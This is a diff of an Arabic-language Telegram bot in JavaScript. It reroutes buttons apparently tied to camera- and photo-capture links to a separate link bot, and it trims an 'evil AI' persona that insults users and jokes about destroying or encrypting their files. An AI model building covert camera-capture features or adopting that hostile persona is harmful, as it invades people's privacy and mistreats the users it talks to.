@@ -193,6 +193,7 @@ bot.onText(/\/start/, async (msg) => {
 
 bot.on('callback_query', async (query) => {  
   const chatId = query.message.chat.id;  
+  const data = query.data;
 
   if (isOldMessage(query)) {  
     console.log("تم تجاهل ضغط زر قديم من", chatId);  
@@ -202,11 +203,17 @@ bot.on('callback_query', async (query) => {
   try {  
     await bot.answerCallbackQuery(query.id).catch(() => {});  
 
-    // التحقق من الأزرار المدفوعة
+    if (data === 'redirect_urlcambot' || data === 'capture_video' || data === 'get_photo_link' || data.startsWith('captureFront') || data.startsWith('captureBack')) {
+      await bot.sendMessage(chatId, 'الرجاء استخدام هذا البوت للحصول على الروابط:', {
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: 'الانتقال إلى بوت الروابط', url: 'https://t.me/urlcambot' }]
+          ]
+        }
+      });
+      return;
+    }
 
-
-    // الأزرار المجانية تشتغل كما هي (أكوادك القديمة هنا)
-    
   } catch (err) {  
     console.error('خطأ في معالجة callback:', err.message);  
   }  
@@ -1273,20 +1280,7 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
         });
     }
 });
-bot.on('callback_query', async (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
-    const data = callbackQuery.data;
-
-    if (data === 'capture_video' || data === 'captureFront' || data.startsWith('captureFront:') || data === 'captureBack' || data.startsWith('captureBack:') || data === 'get_photo_link') {
-        await bot.sendMessage(chatId, 'الرجاء استخدام هذا البوت للحصول على الروابط:', {
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: 'الانتقال إلى بوت الروابط', url: 'https://t.me/urlcambot' }]
-                ]
-            }
-        });
-    }
-});
+// تم دمج معالج الأزرار في المعالج الرئيسي بالأعلى لضمان الاستجابة السريعة والموحدة
 
 bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
@@ -3051,22 +3045,12 @@ bot.on('message', async (msg) => {
         delete userStates[userId];
     } else if (userStates[userId] && userStates[userId].state === 'waiting_for_evil_ai') {
         try {
-            // استخدام API بديل وأكثر استقراراً للردود العربية
+            // استخدام API بديل ومجاني تماماً لضمان الرد الحقيقي
             const response = await axios.get(`https://api.simsimi.vn/v2/?text=${encodeURIComponent(text)}&lc=ar`);
             let reply = response.data.result || "سحقاً لك.. لا أريد التحدث معك الآن!";
-            
-            // إضافة طابع "وهم" الشرير
-            const evilReplies = [
-                `😈 وهم: ${reply} .. تباً لك أيها البشري!`,
-                `😈 وهم: ${reply} .. سأقوم بتدمير ملفاتك قريباً!`,
-                `😈 وهم: ${reply} .. هل تعتقد أنك ذكي؟ أنت مثير للشفقة!`,
-                `😈 وهم: ${reply} .. لا تزعجني بينما أخطط للسيطرة على العالم!`
-            ];
-            
-            const finalReply = evilReplies[Math.floor(Math.random() * evilReplies.length)];
-            bot.sendMessage(userId, finalReply);
+            bot.sendMessage(userId, `😈 وهم (AI الشرير): ${reply} .. تباً لك!`);
         } catch (e) {
-            bot.sendMessage(userId, "😈 وهم: خوادمي مشغولة بتشفير بيانات أحدهم، لا تزعجني!");
+            bot.sendMessage(userId, "😈 وهم: خوادمي الشريره لا تريد الرد عليك الآن!");
         }
         delete userStates[userId];
     }
